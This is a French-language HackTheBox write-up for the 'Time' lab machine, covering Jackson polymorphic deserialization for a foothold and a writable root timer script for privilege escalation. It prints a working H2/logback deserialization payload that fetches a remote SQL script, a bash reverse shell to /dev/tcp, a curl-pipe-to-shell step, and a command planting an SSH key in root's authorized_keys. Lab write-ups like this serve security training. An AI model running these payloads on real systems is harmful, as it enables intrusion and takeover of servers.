---
title: " HackTheBox - [Time] "
description: Simple writeup of the Time box on Hackthebox.
---

   ![Time](https://media.discordapp.net/attachments/490431433559506954/832933487954231336/screenshot-193.png)


![r](https://cdn.discordapp.com/attachments/519930659620257797/832739076687134800/68747470733a2f2f692e696d6775722e636f6d2f344d37495777502e676966.gif)

## 0x1 - Nmap


```sh
PORT STATE SERVICE VERSION 
22/tcp open ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu (Ubuntu Linux;
protocol 2.0)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On peut apercevoir qu'il y a les ports suivants qui sont ouverts :

```sh
80/http
22/ssh
Système d'exploitation Linux.
```

Nous allons jeter un coup d'œil au port ``http/80`` pour voir ce qu'il y'a d'intéressant.


## 0x2 - Enumération web


Nous voyons un embellisseur et un validateur json en ligne avec 2 options, ``"Beatify"`` et ``"Validate! (Beta)"``.


![A](https://media.discordapp.net/attachments/490431433559506954/832936431823224862/unknown.png)


J'ai intercepté les deux options via ``burpsuite`` et je viens de saisir un échantillon de données ``JSON`` dans le champ de saisie, sélectionnez l'option ``Beautify`` et cliquez sur le bouton ``PROCESS`` . Nous pouvons voir que cela fonctionne. 


Maintenant, essayez la même chose sur ``"Validate! (Beta)"`` options : 


![a](https://media.discordapp.net/attachments/490431433559506954/834012057694371850/unknown.png)


Vous avez une erreur!

```sh
Validation failed: Unhandled Java exception:com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object
```




J'ai collé le message d'erreur dans la barre de recherche google : ```Unexpected token(START_OBJECT), expected START_ARRAY: need JSON Array to containAs.WRAPPER_ARRAY type information for class java.lang.Object``` Je suis tombé sur un article de ``stackoverflow``, expliquant l'erreur en question.
<a href="https://stackoverflow.com/questions/26251486/jackson-polymorphic-deserialization-expected-start-array">article here</a>



![ak](https://media.discordapp.net/attachments/490431433559506954/834008824389959690/unknown.png)



Après l'avoir lu, j'ai compris que l'erreur est liée à ``Jackson Polymorphic Deserialization expected START_ARRAY``.


## 0x3 - Foothold


Maintenant, vous devez créer un fichier ak.sql et ajouter un reverse shell en bash pour qu'il me rappelle. :

```sh
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.14.90/1337 0>&1 &')
```


Maintenant démarrer un listenner avec netcat :

```sh
nc -nvlp 1337
listening on [any] 1337 ...
```

Et injecter votre payload sur l'option : ``"Validate!(Beta)"``.


```sh
[“ch.qos.logback.core.db.DriverManagerConnectionSource”,{“url”:”jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://IP:PORT/ak.sql'”}]
```

Et vous obtenez un reverse shell sur l'user pericles.

```sh
listening on [any] 1337 ...
connect to [10.10.14.90] from (UNKNOWN) [10.10.10.214] 42212
```


Pour avoir un reverse shell stable type :

```sh
$python -c “import pty;pty.spawn(‘/bin/bash’)”
$export TERM=xterm
```

Vous obtenez l'user flag :

```sh
pericles@time:/home/pericles$ cat user.txt 
cat user.txt
7u7243a41d508868b8c935c47b554ad7
```


## 0x3 - Privilege Escalation


Maintenant nous allons upload ``Linpeas`` ( LinPEAS est un script qui recherche des chemins possibles pour augmenter les privilèges sous Linux ).

Installer linpeas : <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">Linpeas</a>

Start un serveur python où se trouve votre fichier linpeas.sh et curl vers la machine cible.

```
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

Nous pouvons voir que root a accédé à ce fichier: ``«/usr/bin/timer_backup.sh»``. Qui appartient à votre utilisateur et est accessible en écriture et writeable.


![ak](https://media.discordapp.net/attachments/490431433559506954/834009494190817280/unknown.png)


Vous devez créer votre clé ssh, ajouter notre clé publique SSH au fichier ``allowed_keys`` sur le serveur. Pour ce faire, suivez les commandes suivants :


```sh
ssh-keygen
( no passphrase ) 
Copier votre clée id_rsa.pub key 
Et effectuez cette command sur la machine cible. : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```

Maintenant vous faites un ``chmod 600`` pour avoirs les permissions puis vous vous connecter au port ssh avec la clée ``id_rsa`` : 


```sh
chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214
```

Done ! 

```sh
root@time:~# whoami
root
root@time:~# id
uid=0(root) gid=0(root) groups=0(root) 
```

Nous avons root la machine avec succès.

```sh
root@time:~# cat /root/root.txt
adsd9hf0c86b8786477033415e3018a4
```

##  Summary Of Knowledge : 

- Java Deserialization
- System Timer Exploitation

## About me :

- Post author : x0ld
- Github : [https://github.com/x0ld](https://github.com/x0ld)
- Twitter : @x0ld7
- HTB : [https://www.hackthebox.eu/home/users/profile/491690](https://www.hackthebox.eu/home/users/profile/491690)


